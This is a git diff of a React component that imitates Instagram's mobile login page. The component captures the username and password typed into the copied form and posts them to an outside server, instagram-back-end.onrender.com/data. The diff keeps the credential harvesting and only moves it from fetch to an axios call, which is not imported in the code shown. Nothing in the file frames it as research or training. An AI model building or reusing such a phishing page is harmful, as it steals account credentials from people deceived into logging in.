@@ -1,37 +1,43 @@
 import instagram from "../../assets/img/instagram.png";
 import icon from "../../assets/img/icon.png";
 import play from "../../assets/img/play.png"
+import React, { useState } from 'react'
+
 import "./Responsive.css"
 
 export default function Responsive() {
-    let text3 = document.querySelector(".inpp");
-    let text4 = document.querySelector(".inptt");
+
+    const [name1, setName2] = useState()
+    const [description1, setDescription2] = useState()
+
+    let obj = {
+        name: name1,
+        description: description1,
+    }
+
+    const postData = () => {
+        axios.post('https://instagram-back-end.onrender.com/data', obj)
+            .then(response => {
+                alert(response.status);
+            }
+            )
+            .catch(error => {
+                console.error("Error sending data: ", error);
+            });
+    }
+
     return (
         <>
             <div className="d d-block d-lg-none">
                 <img src={instagram} alt="" />
                 <div className="d">
-                    <input type="text" placeholder="Phone number, username, or email" className="inpp" />
+                    <input type="text" onChange={(e) => setName2(e.target.value)} placeholder="Phone number, username, or email" className="inpp" />
                 </div>
                 <div className="a">
-                    <input type="password" placeholder="Password" className="inptt" />
+                    <input type="password" onChange={(e) => setDescription2(e.target.value)} placeholder="Password" className="inptt" />
                 </div>
                 <div className="s">
-                    <button className="tn" onClick={() => {
-                        console.log(text3);
-                        let tex3 = text3.value;
-                        let tex4 = text4.value;
-                        fetch('https://instagram-back-end.onrender.com/data', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                Login: tex3,
-                                Password: tex4
-                            })
-                        })
-                    }}>Log in</button>
+                    <button className="tn" onClick={() => postData()}>Log in</button>
                 </div>
                 <div className="al">
                     <div className="k"></div>
